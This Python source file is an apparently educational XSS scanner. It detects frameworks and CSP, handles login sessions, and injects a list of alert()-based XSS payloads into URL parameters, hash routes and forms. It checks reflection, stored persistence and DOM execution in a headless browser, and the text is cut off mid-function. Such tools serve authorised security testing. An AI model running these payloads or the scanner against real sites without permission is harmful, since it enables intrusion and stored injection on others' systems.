#!/usr/bin/env python3
import sys
import shutil
import html
import requests
import re
import time
import json
import uuid
import argparse
import threading
import pickle
import os
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote
from bs4 import BeautifulSoup
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum

# optional dependencies
try:
    from playwright.sync_api import sync_playwright, Browser, Page
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import pyfiglet
    PYFIGLET_AVAILABLE = True
except ImportError:
    PYFIGLET_AVAILABLE = False

# banner stuff

_ANSI_GREEN = "\033[92m"
_ANSI_RESET = "\033[0m"


def _enable_windows_ansi():
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            mode = ctypes.c_uint32()
            kernel32.GetConsoleMode(handle, ctypes.byref(mode))
            kernel32.SetConsoleMode(handle, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except Exception:
            pass


def print_banner(name: str):
    _enable_windows_ansi()

    if PYFIGLET_AVAILABLE:
        try:
            art = pyfiglet.figlet_format(name, font="ansi_shadow")
            print(_ANSI_GREEN + art + _ANSI_RESET)
        except Exception:
            _print_fallback_banner(name)
    else:
        _print_fallback_banner(name)

def _print_fallback_banner(name: str):
    spaced = "   ".join(ch * 2 for ch in name.upper())
    width = max(len(spaced) + 6, 50)
    lines = [
        "+" + "-" * (width - 2) + "+",
        "|" + " " * (width - 2) + "|",
        f"|{spaced:^{width - 2}}|",
        "|" + " " * (width - 2) + "|",
        "+" + "-" * (width - 2) + "+",
    ]
    print(_ANSI_GREEN + "\n".join(lines) + _ANSI_RESET)

def _plain_print(msg):
    print(msg)

class _SimpleLogger:
    def info(self, msg): _plain_print(msg)
    def warning(self, msg): _plain_print(msg)
    def error(self, msg): _plain_print(msg)
    def log(self, level, msg): _plain_print(msg)

logger = _SimpleLogger()

# for configs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; AdvancedXSSScanner/3.0; +educational-use)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

TIMEOUT = 10
MAX_RETRIES = 3
CONCURRENT_WORKERS = 5
RATE_LIMIT = 10
SESSION_FILE = "scanner_session.pkl"


class Framework(Enum):
    UNKNOWN = "unknown"
    REACT = "react"
    VUE = "vue"
    ANGULAR = "angular"
    JQUERY = "jquery"
    SVELTE = "svelte"

class FindingTypes:
    REFLECTED_XSS = 'reflected_xss'
    REFLECTED_XSS_CONFIRMED = 'reflected_xss_confirmed'
    REFLECTED_XSS_UNCONFIRMED = 'reflected_xss_unconfirmed'
    DOM_XSS_CONFIRMED = 'dom_xss_confirmed'
    DOM_XSS_CONFIRMED_INTERACTIVE = 'dom_xss_confirmed_interactive'
    STORED_XSS_PERSISTENT = 'stored_xss_persistent'

    CONFIRMED = frozenset({
        REFLECTED_XSS_CONFIRMED,
        DOM_XSS_CONFIRMED,
        DOM_XSS_CONFIRMED_INTERACTIVE,
    })

@dataclass
class SessionConfig:
    """Authentication and session configuration"""
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    login_url: Optional[str] = None
    auth_token: Optional[str] = None
    session_id: Optional[str] = None
    
    def is_authenticated(self) -> bool:
        return bool(self.cookies or self.auth_token or self.session_id)

@dataclass
class CSPInfo:
    """Content Security Policy information"""
    policy: str = ""
    script_src: List[str] = field(default_factory=list)
    default_src: List[str] = field(default_factory=list)
    object_src: List[str] = field(default_factory=list)
    base_uri: List[str] = field(default_factory=list)
    trusted_types: Optional[List[str]] = None
    requires_trusted_types: bool = False
    
    def allows_inline_script(self) -> bool:
        """Check if CSP allows inline scripts"""
        if not self.script_src:
            return True
        return any(s in ["'unsafe-inline'", "*"] for s in self.script_src)
    
    def allows_unsafe_eval(self) -> bool:
        """Check if CSP allows eval()"""
        if not self.script_src:
            return True
        return "'unsafe-eval'" in self.script_src

# payloads per framework that will be used

class FrameworkPayloadGenerator:
    """Generate framework specific XSS payloads"""
    
    @staticmethod
    def get_react_payloads():
        """This reacts specific XSS vectors dangerouslySetInnerHTML, href, etc"""
        return [
            '{{"__html":"<img src=x onerror=alert(1)>"}}',
            '{{"__html":"<script>alert(1)</script>"}}',
            'javascript:alert(1)//',
            '{"onClick":"alert(1)"}',
            '"><img src=x onerror=alert(1)>',
        ]
    
    @staticmethod
    def get_vue_payloads():
        """Vue.js-specific XSS vectors - v-html, directives, etc"""
        return [
            '<img src=x onerror=alert(1)>',
            '<script>alert(1)</script>',
            'v-html="alert(1)"',
            'v-on:click="alert(1)"',
            '@click="alert(1)"',
            '{{constructor.constructor("alert(1)")()}}',
            '{{new Function("alert(1)")()}}',
        ]
    
    @staticmethod
    def get_angular_payloads():
        return [
            '{{constructor.constructor("alert(1)")()}}',
            '{{[].constructor.constructor("alert(1)")()}}',
            '(click)="alert(1)"',
            '[innerHTML]="alert(1)"',
            '"><img src=x onerror=alert(1)>',
            '<a href="javascript:alert(1)">click</a>',
        ]
    
    @staticmethod
    def get_generic_payloads():
        """Standard XSS payloads that work """
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "\" onmouseover=alert('XSS') \"",
            "';alert(1);//",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
        ]
    
    @staticmethod
    def get_payloads_for_framework(framework: Framework) -> List[str]:
        payloads = FrameworkPayloadGenerator.get_generic_payloads()
        
        if framework == Framework.REACT:
            payloads.extend(FrameworkPayloadGenerator.get_react_payloads())
        elif framework == Framework.VUE:
            payloads.extend(FrameworkPayloadGenerator.get_vue_payloads())
        elif framework == Framework.ANGULAR:
            payloads.extend(FrameworkPayloadGenerator.get_angular_payloads())
        
        return list(dict.fromkeys(payloads))  # Remove duplicates


class FrameworkDetector:
    @staticmethod
    def detect(response_text: str) -> Framework:
        frameworks = {
            Framework.REACT: [
                r'react\.js', r'react-dom\.js', r'__REACT_DEVTOOLS_GLOBAL_HOOK__',
                r'data-reactroot', r'data-reactid', r'_reactRootContainer'
            ],
            Framework.VUE: [
                r'vue\.js', r'vue\.min\.js', r'__VUE__', r'data-v-',
                r'v-html', r'v-on:', r'@click', r'{{.*}}'
            ],
            Framework.ANGULAR: [
                r'angular\.js', r'ng-', r'ngApp', r'ng-controller',
                r'{{.*}}', r'ng-model', r'ng-click'
            ],
            Framework.JQUERY: [
                r'jquery\.js', r'\$\(.*\)', r'\.jQuery'
            ],
            Framework.SVELTE: [
                r'svelte', r'__SVELTE__'
            ]
        }
        
        for framework, patterns in frameworks.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return framework
        
        return Framework.UNKNOWN


class CSPAnalyzer:
    
    @staticmethod
    def extract_policy(response) -> Optional[CSPInfo]:
        csp_header = response.headers.get('Content-Security-Policy', '')
        if not csp_header:
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_csp = soup.find('meta', attrs={'http-equiv': 'Content-Security-Policy'})
            if meta_csp:
                csp_header = meta_csp.get('content', '')
        
        if not csp_header:
            return None
        
        csp_info = CSPInfo(policy=csp_header)
        
        directives = csp_header.split(';')
        for directive in directives:
            directive = directive.strip()
            if not directive:
                continue
            
            parts = directive.split(' ', 1)
            if len(parts) != 2:
                continue
            
            name, values = parts
            values_list = [v.strip() for v in values.split(' ') if v.strip()]
            
            if name == 'script-src':
                csp_info.script_src = values_list
            elif name == 'default-src':
                csp_info.default_src = values_list
            elif name == 'object-src':
                csp_info.object_src = values_list
            elif name == 'base-uri':
                csp_info.base_uri = values_list
            elif name == 'require-trusted-types-for':
                csp_info.requires_trusted_types = True
                if "'script'" in values_list:
                    csp_info.trusted_types = ['script']
        
        return csp_info
    
    @staticmethod
    def analyze_csp_blocking(csp_info: Optional[CSPInfo], payload: str) -> Dict[str, bool]:
        """Analyze if CSP would block the payload"""
        if not csp_info:
            return {'blocked': False, 'reason': 'No CSP'}
        
        analysis = {
            'blocked': False,
            'reasons': []
        }
        
        # check if inline scripts is blocked?
        if '<script>' in payload.lower() and not csp_info.allows_inline_script():
            analysis['blocked'] = True
            analysis['reasons'].append('Inline scripts blocked by CSP')
        
        # same as abovr chrcks if eval() is blocked?
        if 'eval(' in payload and not csp_info.allows_unsafe_eval():
            analysis['blocked'] = True
            analysis['reasons'].append('eval() blocked by CSP')
        
        # same but for csp trusted types?
        if csp_info.requires_trusted_types and 'innerHTML' in payload:
            analysis['blocked'] = True
            analysis['reasons'].append('Trusted Types required for innerHTML')
        
        return analysis


def _parse_forms_from_html(html_text: str, tag_csrf: bool = False) -> List[Dict]:
    soup = BeautifulSoup(html_text, 'html.parser')
    csrf_patterns = ['csrf', 'token', 'authenticity_token', '_token', 'xsrf']
    forms = []
    for form in soup.find_all('form'):
        action = form.attrs.get('action', '')
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        for tag in form.find_all(['input', 'textarea', 'select']):
            name = tag.attrs.get('name')
            if not name:
                continue
            input_type = tag.attrs.get('type', 'text')
            default_value = tag.attrs.get('value', '')
            if tag_csrf:
                is_csrf = any(p in name.lower() for p in csrf_patterns)
                inputs.append({
                    'name': name,
                    'type': 'hidden' if is_csrf else input_type,
                    'value': default_value,
                    'csrf': is_csrf,
                })
            else:
                inputs.append({'name': name, 'type': input_type, 'value': default_value})
        forms.append({'action': action, 'method': method, 'inputs': inputs})
    return forms


class SessionManager:
    """Manage authentication and sessions"""
    
    def __init__(self, session_file: str = SESSION_FILE):
        self.session_file = session_file
        self.config = SessionConfig()
        self.load_session()
    
    def load_session(self):
        """Load saved session from file"""
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'rb') as f:
                    saved = pickle.load(f)
                    self.config = saved
                    logger.info(f"Loaded saved session with {len(self.config.cookies)} cookies")
            except Exception as e:
                logger.warning(f"Failed to load session: {e}")
    
    def save_session(self):
        """Save session to file"""
        try:
            with open(self.session_file, 'wb') as f:
                pickle.dump(self.config, f)
            logger.info("Session saved")
        except Exception as e:
            logger.warning(f"Failed to save session: {e}")
    
    def import_cookies(self, cookie_string: str):
        """Import cookies from string (e.g., from browser)"""
        cookies = {}
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
        self.config.cookies.update(cookies)
        self.save_session()
        logger.info(f"Imported {len(cookies)} cookies")
    
    def import_headers(self, header_string: str):
        """Import custom headers"""
        headers = {}
        for header in header_string.split(','):
            if ':' in header:
                name, value = header.strip().split(':', 1)
                headers[name.strip()] = value.strip()
        self.config.headers.update(headers)
        self.save_session()
        logger.info(f"Imported {len(headers)} headers")
    
    def login(self, login_url: str, username: str, password: str, 
              username_field: str = 'username', password_field: str = 'password',
              submit_field: str = 'submit'):
        """Perform login and capture session"""
        session = requests.Session()
        session.headers.update(HEADERS)
        
        # grab the login page first to get csrf token
        try:
            resp = session.get(login_url, timeout=TIMEOUT)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # finds the csrf token if there is one
            csrf_token = None
            csrf_input = soup.find('input', {'name': re.compile(r'csrf|token|authenticity_token', re.I)})
            if csrf_input:
                csrf_token = csrf_input.get('value')
            
            # this will build the post data
            login_data = {
                username_field: username,
                password_field: password,
            }
            if csrf_token:
                login_data[csrf_input.get('name')] = csrf_token
            if submit_field:
                login_data[submit_field] = 'Login'
            
            # actually logs  in
            login_response = session.post(login_url, data=login_data, timeout=TIMEOUT)
            
            if login_response.status_code == 200:
                self.config.cookies = session.cookies.get_dict()
                self.config.login_url = login_url

                token_match = re.search(r'"token":"([^"]+)"', login_response.text)
                if token_match:
                    self.config.auth_token = token_match.group(1)
                
                self.save_session()
                logger.info(f"Login successful! Got {len(self.config.cookies)} cookies")
                return True
            else:
                logger.error(f"Login failed with status {login_response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Login error: {e}")
            return False
    
    def apply_session(self, session: requests.Session):
        if self.config.cookies:
            session.cookies.update(self.config.cookies)
        
        if self.config.headers:
            session.headers.update(self.config.headers)
        
        if self.config.auth_token:
            session.headers.update({'Authorization': f'Bearer {self.config.auth_token}'})
    
    def clear_session(self):
        self.config = SessionConfig()
        if os.path.exists(self.session_file):
            os.remove(self.session_file)
        logger.info("Session cleared")


class BotDetector:
    """This detect CAPTCHA or bot protection pages"""
    
    @staticmethod
    def detect(response) -> Dict[str, Any]:
        """Check if response is a CAPTCHA or bot protection page"""
        if not response:
            return {'is_bot_page': False}
        
        text = response.text.lower()
        status = response.status_code
        
  
        captcha_indicators = [
            'captcha', 'recaptcha', 'hcaptcha', 'verify you are human',
            'prove you are human', 'security check', 'bot protection',
            'access denied', 'please confirm you are not a robot'
        ]
        
        bot_headers = ['x-ratelimit', 'x-block', 'cf-chl-bypass', 'cf-bypass']
        
        indicators = []
        for indicator in captcha_indicators:
            if indicator in text:
                indicators.append(indicator)
        
        for header in bot_headers:
            if header in response.headers:
                indicators.append(f"header: {header}")
        
        if 'cf-challenge' in text or ('cloudflare' in text and 'challenge' in text):
            indicators.append('cloudflare_challenge')

        page_is_short = len(response.text) < 3000
        keyword_hit = len(indicators) >= 2 or (len(indicators) == 1 and page_is_short)
        is_bot_page = keyword_hit or status in [403, 429, 503]
        
        return {
            'is_bot_page': is_bot_page,
            'indicators': indicators,
            'status_code': status,
            'suggested_action': 'add_delay' if is_bot_page else 'continue'
        }


class StoredXSSChecker:
    
    @staticmethod
    def check_persistence(base_url: str, session: requests.Session, 
                          payload: str, injection_point: str) -> Dict[str, Any]:
        result = {
            'persists': False,
            'session_detected': None,
            'evidence': []
        }
        
        response = StoredXSSChecker._inject_payload(base_url, session, payload, injection_point)
        if not response:
            return result
        
        if payload in response.text:
            result['evidence'].append('injected_in_same_session')
        
        new_session = requests.Session()
        new_session.headers.update(HEADERS)
        
        check_response = StoredXSSChecker._check_persisted(base_url, new_session, payload)
        if check_response and payload in check_response.text:
            result['persists'] = True
            result['evidence'].append('persists_across_sessions')
            result['session_detected'] = True
        
        return result
    
    @staticmethod
    def _inject_payload(base_url: str, session: requests.Session, 
                        payload: str, injection_point: str) -> Optional[requests.Response]:
        try:
            if 'form' in injection_point:
                forms = StoredXSSChecker._extract_forms(base_url, session)
                for form in forms:
                    response = StoredXSSChecker._submit_form(base_url, session, form, payload)
                    if response and response.status_code == 200:
                        return response
            else:
                parsed = urlparse(base_url)
                params = parse_qs(parsed.query)
                new_params = {k: v[0] for k, v in params.items()}
                new_params['test'] = payload
                fuzzed_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                return session.get(fuzzed_url, timeout=TIMEOUT)
        except Exception:
            pass
        return None
    
    @staticmethod
    def _check_persisted(base_url: str, session: requests.Session, 
                         payload: str) -> Optional[requests.Response]:
        try:
            return session.get(base_url, timeout=TIMEOUT)
        except requests.RequestException:
            return None
    
    @staticmethod
    def _extract_forms(url: str, session: requests.Session) -> List[Dict]:
        try:
            response = session.get(url, timeout=TIMEOUT)
            return _parse_forms_from_html(response.text)
        except Exception:
            return []
    
    @staticmethod
    def _submit_form(base_url: str, session: requests.Session, 
                     form: Dict, payload: str) -> Optional[requests.Response]:
        """Submit form with payload"""
        try:
            target_url = urljoin(base_url, form['action']) if form['action'] else base_url
            data = {}
            for field in form['inputs']:
                if field['type'] in ('submit', 'button', 'reset'):
                    data[field['name']] = field['value']
                else:
                    data[field['name']] = payload
            
            if form['method'] == 'post':
                return session.post(target_url, data=data, timeout=TIMEOUT)
            else:
                return session.get(target_url, params=data, timeout=TIMEOUT)
        except Exception:
            return None

# the actual xss scanner

class AdvancedXSSScanner:
    """Enhanced XSS Scanner with authentication, framework detection, and more"""
    
    def __init__(self, target_url: str, verbose: bool = False, output_format: str = 'text',
                 crawl_depth: int = 1, parallel: bool = False, verify_dom: bool = False,
                 max_payloads: int = 20, session_manager: Optional[SessionManager] = None,
                 detect_framework: bool = True, analyze_csp: bool = True,
                 check_stored_persistence: bool = True, dom_debug: bool = False,
                 show_browser: bool = False):
        
        self.target_url = target_url
        self.verbose = verbose
        self.output_format = output_format
        self.crawl_depth = crawl_depth
        self.parallel = parallel
        self.verify_dom = verify_dom
        self.max_payloads = max_payloads
        self.detect_framework = detect_framework
        self.analyze_csp = analyze_csp
        self.check_stored_persistence = check_stored_persistence
        self.dom_debug = dom_debug
        self._debug_seen = set()
        self._debug_seen_lock = threading.Lock()
        self.headless = not show_browser
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session_manager = session_manager or SessionManager()
        self.session_manager.apply_session(self.session)
        self.rate_limiter = RateLimiter()
        self.findings = []
        self.visited_urls = set()
        self.visited_lock = threading.Lock()
        self.findings_lock = threading.Lock()
        self.payload_results = []
        self.payload_results_lock = threading.Lock()
        self.framework = Framework.UNKNOWN
        self.csp_info: Optional[CSPInfo] = None
        self.bot_detected = False
        self.payloads = self._generate_payloads()
        

        self.stats = {
            'requests_made': 0,
            'requests_failed': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'csp_blocked': 0
        }
    
    def _generate_payloads(self) -> List[str]:
        base_payloads = FrameworkPayloadGenerator.get_payloads_for_framework(self.framework)
        return list(dict.fromkeys(base_payloads))[:self.max_payloads]
    
    def _detect_framework_and_csp(self, response):
        if self.detect_framework and response:
            self.framework = FrameworkDetector.detect(response.text)
            if self.framework != Framework.UNKNOWN:
                self.log(f"[*] Detected framework: {self.framework.value}", 'info')                
                self.payloads = self._generate_payloads()
        
        if self.analyze_csp and response:
            self.csp_info = CSPAnalyzer.extract_policy(response)
            if self.csp_info:
                self.log(f"[*] CSP detected: {self.csp_info.policy[:100]}...", 'info')
                if not self.csp_info.allows_inline_script():
                    self.log("[!] CSP blocks inline scripts - many payloads will be blocked", 'warning')
    
    def log(self, message: str, level: str = 'info'):
        if self.verbose or level in ('warning', 'error'):
            print(message)
    
    def add_finding(self, finding: Dict):
        with self.findings_lock:
            self.findings.append(finding)
            self.stats['vulnerabilities_found'] += 1

    _PAYLOAD_LABELS = {
        "<script>alert('DOMXSS')</script>": "script tag",
        "<img src=x onerror=alert('DOMXSS')>": "img onerror",
        "'-alert('DOMXSS')-'": "quote breakout",
        "{{constructor.constructor('alert(1)')()}}": "ng/vue template",
        "{{new Function('alert(1)')()}}": "vue newfunc",
        "javascript:alert(1)": "js: uri",
        "javascript:alert('DOMXSS')": "js: uri (click)",
        "\" onerror=\"alert('DOMXSS');//": "onerror dq",
        "' onerror='alert(\"DOMXSS\");//": "onerror sq",
        "\" onload=\"alert('DOMXSS');//": "onload dq",
        "' onload='alert(\"DOMXSS\");//": "onload sq",
        "');alert('DOMXSS')//": "call-break sq",
        '");alert("DOMXSS")//': "call-break dq",
        "');alert('DOMXSS');//": "call-break sq+semi",
        "data:text/javascript,alert('DOMXSS')": "data: uri",
        "<iframe src=\"javascript:alert('DOMXSS')\">": "iframe js: src",
    }

    def _payload_label(self, payload: str) -> str:
        return self._PAYLOAD_LABELS.get(payload, payload[:40])

    def _new_authenticated_page(self, browser):
        context = browser.new_context()
        cookies = self.session_manager.config.cookies
        if cookies:
            domain = urlparse(self.target_url).hostname
            playwright_cookies = [
                {'name': name, 'value': value, 'domain': domain, 'path': '/'}
                for name, value in cookies.items()
            ]
            try:
                context.add_cookies(playwright_cookies)
            except Exception as e:
                self.log(f"[!] couldnt apply cookies to browser context: {e}", 'error')
        return context.new_page()

    def _dismiss_overlays(self, page):
        try:
            page.keyboard.press("Escape")
        except Exception:
            pass
        for selector in (
            '.cdk-overlay-backdrop',
            'button[aria-label*="close" i]',
            'button[mat-dialog-close]',
            '.close-dialog',
        ):
            try:
                el = page.query_selector(selector)
                if el and el.is_visible():
                    el.click(timeout=2000)
            except Exception:
                continue

    def _reveal_hidden_search_boxes(self, page):

        for selector in (
            'button[aria-label*="search" i]',
            'button[mat-icon-button][aria-label*="Search" i]',
            'mat-icon:has-text("search")',
            '[aria-label="Search"]',
            '#searchButton',
            '.search-icon',
        ):
            try:
                el = page.query_selector(selector)
                if el and el.is_visible():
                    el.click(timeout=2000)
                    page.wait_for_timeout(300)
            except Exception:
                continue

    def _get_fuzzable_param_groups(self, url: str):

        parsed = urlparse(url)
        groups = []

        real_params = parse_qs(parsed.query)
        if real_params:
            groups.append(('query', parsed, '', real_params))

        fragment = parsed.fragment
        if '?' in fragment:
            route_path, _, query_part = fragment.partition('?')
            hash_params = parse_qs(query_part)
            if hash_params:
                groups.append(('hash', parsed, route_path, hash_params))
        elif fragment and not groups:
            guessed = {name: [''] for name in (
                'q', 'query', 'search', 'name', 'id', 'term', 'keyword',
                'next', 'redirect', 'url',
            )}
            groups.append(('hash', parsed, fragment, guessed))

        return groups or [('query', parsed, '', {})]

    def _build_fuzzed_url(self, mode, parsed, route_path, new_params):
        if mode == "hash":
            query = "&".join(
                f"{k}={quote(v[0] if isinstance(v, list) else v, safe='')}"
                for k, v in new_params.items()
            )
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{route_path}?{query}"
        else:
            flat = {k: (v[0] if isinstance(v, list) else v) for k, v in new_params.items()}
            return urlunparse(parsed._replace(query=urlencode(flat)))

    def _record_payload_result(self, payload: str, mode: str, success: bool):
        with self.payload_results_lock:
            self.payload_results.append({
                'payload': payload,
                'label': self._payload_label(payload),
                'mode': mode,
                'success': success,
            })

    def _print_payload_results(self):
        if not self.payload_results:
            return
        print("\nPayloads tried:")
        seen = set()
        for r in self.payload_results:
            key = (r['label'], r['mode'])
            if key in seen:
                continue
            seen.add(key)
            mark = "worked" if r['success'] else "no"
            print(f"  [{r['mode']:5s}] {r['label']:40s} - {mark}")

    # this is only for requests and avoiding bot detection
    
    def safe_request(self, url: str, method: str = 'GET', data: Optional[Dict] = None,
                     params: Optional[Dict] = None, allow_error_status: bool = False):

        self.rate_limiter.wait()
        self.stats['requests_made'] += 1
        
        for attempt in range(MAX_RETRIES):
            try:
                if method.upper() == 'POST':
                    response = self.session.post(url, data=data, params=params,
                                                timeout=TIMEOUT, allow_redirects=True)
                else:
                    response = self.session.get(url, params=params,
                                               timeout=TIMEOUT, allow_redirects=True)
                
                bot_check = BotDetector.detect(response)
                if bot_check['is_bot_page']:
                    self.bot_detected = True
                    self.log(f"[!] Bot/CAPTCHA detected: {bot_check['indicators']}", 'warning')
                    time.sleep(5)
                
                if not allow_error_status and response.status_code >= 500:
                    self.stats['requests_failed'] += 1
                    time.sleep(2 ** attempt)
                    continue
                
                return response
                
            except requests.RequestException as e:
                self.stats['requests_failed'] += 1
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
        
        return None
    
    
    def extract_forms(self, url: str) -> List[Dict]:
        """Extract forms with CSRF token detection"""
        response = self.safe_request(url)
        if not response:
            return []
        return _parse_forms_from_html(response.text, tag_csrf=True)
    
    
    def refresh_csrf(self, base_url: str, form: Dict) -> Tuple[Optional[str], Optional[str]]:
        fresh_forms = self.extract_forms(base_url)
        for f in fresh_forms:
            if f['action'] == form['action'] and f['method'] == form['method']:
                for field in f['inputs']:
                    if field.get('csrf'):
                        return field['name'], field['value']
        return None, None

    def submit_form(self, base_url: str, form: Dict, payload: str) -> Optional[requests.Response]:
        """Submit form with current session, refreshing any CSRF token first."""
        target_url = urljoin(base_url, form['action']) if form['action'] else base_url
        data = {}

        has_csrf = any(field.get('csrf') for field in form['inputs'])
        fresh_name, fresh_value = (None, None)
        if has_csrf:
            fresh_name, fresh_value = self.refresh_csrf(base_url, form)

        for field in form['inputs']:
            if field.get('csrf'):
                data[field['name']] = fresh_value if fresh_value is not None else field['value']
            elif field['type'] in ('submit', 'button', 'reset'):
                data[field['name']] = field['value']
            else:
                data[field['name']] = payload
        
        if form['method'] == 'post':
            return self.safe_request(target_url, method='POST', data=data)
        return self.safe_request(target_url, method='GET', params=data)
    
    
    def inject_url_params(self, url: str, payload: str) -> List[Tuple[str, str, requests.Response]]:
        """Inject payload into URL parameters with framework awareness"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []
        
        results = []
        for param_name in params:
            new_params = {k: v[0] for k, v in params.items()}
            
            if self.framework == Framework.ANGULAR:
                new_params[param_name] = f"{{{{constructor.constructor('{payload}')()}}}}"
            elif self.framework == Framework.VUE:
                new_params[param_name] = f"{{{{new Function('{payload}')()}}}}"
            else:
                new_params[param_name] = payload
            
            fuzzed_url = urlunparse(parsed._replace(query=urlencode(new_params)))
            response = self.safe_request(fuzzed_url)
            if response:
                results.append((param_name, fuzzed_url, response))
        
        return results
    
    
    def _dom_debug(self, message: str):
        if not self.dom_debug:
            return
        with self._debug_seen_lock:
            if message in self._debug_seen:
                return
            self._debug_seen.add(message)
        logger.info(message)

    def _render_progress(self, detail: str, done: int, total: int):
        if not self.dom_debug:
            return
        try:
            width = shutil.get_terminal_size(fallback=(100, 24)).columns
        except Exception:
            width = 100
        text = f"[*] DOM verification: {done}/{total} tested | {detail}"
        text = text[:max(width - 1, 20)]
        sys.stdout.write("\r\033[K" + text)
        sys.stdout.flush()

    def _progress_break_for_message(self, msg: str):
        if self.dom_debug:
            sys.stdout.write("\r\033[K")
        if self.verbose:
            print(msg)

    def scan_dom_with_browser(self):
        if not PLAYWRIGHT_AVAILABLE:
            self.log("[!] Playwright not installed - skipping DOM verification", 'warning')
            self.log("[!] Install with: pip install playwright && playwright install chromium", 'warning')
            return


        dom_payloads = [
            "<script>alert('DOMXSS')</script>",
            "<img src=x onerror=alert('DOMXSS')>",
            "'-alert('DOMXSS')-'",
            "{{constructor.constructor('alert(1)')()}}",
            "{{new Function('alert(1)')()}}",
            "javascript:alert(1)",
            "\" onerror=\"alert('DOMXSS');//",
            "' onerror='alert(\"DOMXSS\");//",
            "\" onload=\"alert('DOMXSS');//",
            "' onload='alert(\"DOMXSS\");//",
            "');alert('DOMXSS')//",
            '");alert("DOMXSS")//',
            "');alert('DOMXSS');//",
            "data:text/javascript,alert('DOMXSS')",
            "<iframe src=\"javascript:alert('DOMXSS')\">",
        ]

        link_click_payloads = [
            "javascript:alert('DOMXSS')",
        ]

        max_workers = min(6, len(dom_payloads) * 2 + len(link_click_payloads))

        if self.verbose:
            print(f"[*] Testing {min(len(dom_payloads), self.max_payloads)} payloads in a real browser...")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_info = {}
            for payload in dom_payloads[:self.max_payloads]:
                f_url = executor.submit(self._test_dom_payload, self.target_url, payload)
                future_info[f_url] = (payload, 'url')
                f_form = executor.submit(self._test_form_interaction_payload, self.target_url, payload)
                future_info[f_form] = (payload, 'form')

            for payload in link_click_payloads:
                f_link = executor.submit(self._test_link_click_payload, self.target_url, payload)
                future_info[f_link] = (payload, 'link')

            total = len(future_info)
            done = 0
            self._render_progress("starting...", 0, total)

            for future in as_completed(future_info):
                payload, mode = future_info[future]
                label = f"[{mode}]  {self._payload_label(payload)}"
                result = None
                try:
                    result = future.result(timeout=30)
                except Exception as e:
                    self._progress_break_for_message(f"[!] test failed ({label}): {e}")

                done += 1
                self._record_payload_result(payload, mode, success=bool(result))

                if result:
                    with self.findings_lock:
                        self.findings.append(result)
                        self.stats['vulnerabilities_found'] += 1
                    self._progress_break_for_message(
                        f"[+] XSS: {self._payload_label(payload)} ({mode})"
                    )

                self._render_progress(label, done, total)

        if self.dom_debug:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

    def _click_submit_like(self, page, scope=None) -> Optional[str]:
        search_roots = [scope] if scope is not None else []
        search_roots.append(page)

        for root in search_roots:
            for selector in ('button[type=submit]', 'input[type=submit]'):
                try:
                    el = root.query_selector(selector)
                    if el and el.is_visible():
                        label = (el.inner_text() or el.get_attribute('value') or selector).strip()
                        el.click(timeout=3000)
                        return label
                except Exception:
                    continue

        keywords = ('share', 'submit', 'post', 'send', 'go', 'save', 'update', 'search', 'comment', 'sign')
        for root in search_roots:
            try:
                buttons = root.query_selector_all('button, input[type=button], a[role=button]')
            except Exception:
                buttons = []
            for el in buttons:
                try:
                    if not el.is_visible():
                        continue
                    text = (el.inner_text() or '').strip().lower()
                    if any(k in text for k in keywords):
                        el.click(timeout=3000)
                        return text or '(unlabeled button)'
                except Exception:
                    continue

        for root in search_roots:
            try:
                buttons = root.query_selector_all('button, input[type=button], a[role=button]')
            except Exception:
                buttons = []
            for el in buttons:
                try:
                    if el.is_visible():
                        text = (el.inner_text() or '').strip()
                        el.click(timeout=3000)
                        return text or '(unlabeled button, fallback)'
                except Exception:
                    continue

        return None

    def _test_form_interaction_payload(self, base_url: str, payload: str) -> Optional[Dict]:
        if not PLAYWRIGHT_AVAILABLE:
            return None

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=self.headless)
                page = self._new_authenticated_page(browser)
                triggered = []

                def handle_dialog(dialog):
                    triggered.append(dialog.message)
                    dialog.dismiss()

                page.on("dialog", handle_dialog)

                try:
                    page.goto(base_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
                    page.wait_for_timeout(500)
                except Exception as e:
                    self.log(f"[!] Playwright navigation failed for {base_url}: {e}", 'error')
                    browser.close()
